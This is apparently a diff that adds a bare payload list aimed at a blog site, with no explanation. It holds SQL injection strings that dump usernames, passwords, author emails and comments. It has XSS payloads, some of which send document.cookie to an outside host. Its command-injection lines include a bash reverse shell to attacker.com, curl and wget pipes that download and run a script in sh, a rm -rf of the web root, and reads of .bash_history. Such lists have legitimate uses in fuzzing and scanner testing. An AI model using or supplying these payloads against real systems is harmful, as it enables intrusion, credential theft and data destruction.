@@ -1,0 +1,88 @@
+' UNION SELECT NULL, author_name, author_email FROM authors WHERE author_id=2 --  
+<input type="button" value="Click me" onclick="alert('XSS in Blog Site')">  
+<audio src="javascript:alert('XSS in Blog Site')"></audio>  
+| uname -a  
+<script>document.body.innerHTML = '<iframe src="javascript:alert(\'XSS in Blog Site\')"></iframe>';</script>  
+<textarea onfocus="alert('XSS in Blog Site')"></textarea>  
+<img src="javascript:alert('XSS in Blog Site')" onerror="alert('XSS in Blog Site')">  
+' UNION SELECT NULL, post_title, post_content FROM blog_posts --  
+<script>setTimeout('alert("XSS in Blog Site")', 100)</script>  
+; bash -i >& /dev/tcp/attacker.com/1234 0>&1  
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='admin') --  
+; echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh  
+<input type="file" onchange="alert('XSS in Blog Site')">  
+<a href="javascript:alert('XSS in Blog Site')">Click here</a>  
+' UNION SELECT NULL, group_concat(username, ':', password) FROM users --  
+; curl http://attacker.com/malicious_script.sh | sh  
+' AND 'a'='a' --  
+<img src="x" onerror="alert('XSS in Blog Site')">  
+' OR 1=1 LIMIT 1 --  
+<style>@import 'javascript:alert(1)';</style>  
+' UNION SELECT NULL, post_title, post_tags FROM blog_posts WHERE post_id=5 --  
+<script>alert('XSS in Blog Site')</script>  
+; wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh  
+<button onclick="alert('XSS in Blog Site')">Click Me</button>  
+' UNION SELECT NULL, username, password FROM users --  
+' UNION SELECT NULL, username, user_role FROM users --  
+<input type="text" value="Blog <img src='x' onerror='alert(1)'>">  
+<script>document.location='javascript:alert("XSS in Blog Site")'</script>  
+| id  
+<input type="text" value="<img src=x onerror=alert('XSS in Blog Site')>">  
+<button onclick="location='javascript:alert(2)'">Click Me</button>  
+' OR 1=1 AND SELECT table_name FROM information_schema.tables --  
+<svg/onload=alert('XSS in Blog Site')>  
+' UNION SELECT NULL, post_title, post_content, post_date FROM blog_posts --  
+<script>new Image().src='javascript:alert("XSS in Blog Site")'</script>  
+' OR 1=1 --  
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_title='test' --  
+; nc -lvp 1234  
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS in Blog Site')">  
+; cat /var/log/apache2/access.log  
+<script>document.body.innerHTML = '<img src=x onerror=alert("XSS in Blog Site")>';</script>  
+' UNION SELECT NULL, username, password FROM users WHERE username='admin' --  
+<textarea onblur="alert('XSS in Blog Site')"></textarea>  
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>  
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>  
+' OR 1=1 AND SELECT user() --  
+<script>window.alert('XSS in Blog Site');</script>  
+<input onfocus="alert('XSS in Blog Site')" autofocus>  
+<script>window.location="javascript:alert('XSS in Blog Site')"</script>  
+| ping -c 4 127.0.0.1  
+; id  
+<script>var img = new Image(); img.src = "http://example.com?cookie=" + document.cookie;</script>  
+<textarea onfocus="alert('XSS in Blog Site')"></textarea>  
+' AND 1=1 ORDER BY 1 --  
+<input type="text" value="Blog <svg><script>alert('XSS in Blog Site')</script></svg>">  
+<script>setTimeout('alert("XSS in Blog Site")', 5000)</script>  
+' UNION SELECT NULL, comment_author, comment_email FROM comments --  
+<object data="javascript:alert('XSS in Blog Site')"></object>  
+<script>document.body.innerHTML = '<button onclick="alert(\'XSS in Blog Site\')">Click Me</button>';</script>  
+<script>document.body.innerHTML = '<input type="button" value="Test" onclick="alert(\'XSS in Blog Site\')">';</script>  
+<input type="image" src="x" onerror="alert('XSS in Blog Site')">  
+; whoami  
+; rm -rf /var/www/blog/*  
+<form action="javascript:alert('XSS in Blog Site')" method="POST"></form>  
+' UNION SELECT NULL, post_title, post_date FROM blog_posts --  
+' UNION SELECT NULL, comment_author, comment_text FROM comments WHERE post_id=2 --  
+<script>eval('alert(document.cookie)')</script>  
+<button onclick="alert('XSS in Blog Site')">Click me</button>  
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>  
+| curl http://attacker.com/malicious_script.sh | sh  
+; ls  
+<input type="text" value="<script>alert('XSS in Blog Site')</script>">  
+; cat /var/www/blog/.bash_history  
+<input type="button" value="Test" onclick="location='javascript:alert(3)'">  
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>  
+<script>window.location='javascript:alert("XSS in Blog Site")'</script>  
+; echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh  
+' UNION SELECT NULL, post_title, post_author FROM blog_posts WHERE post_id=2 --  
+| cat /var/www/blog/.bash_history  
+<form action="javascript:alert('XSS in Blog Site')" method="POST"></form>  
+<script>eval('alert("XSS in Blog Site")')</script>  
+| ls  
+<script>window.alert('XSS in Blog Site');</script>  
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE category_id=1 --  
+<button onclick="location='javascript:alert(2)'">Click Me</button>  
+; wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh  
+| wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh  
+' UNION SELECT NULL, author_name, author_email FROM authors --  
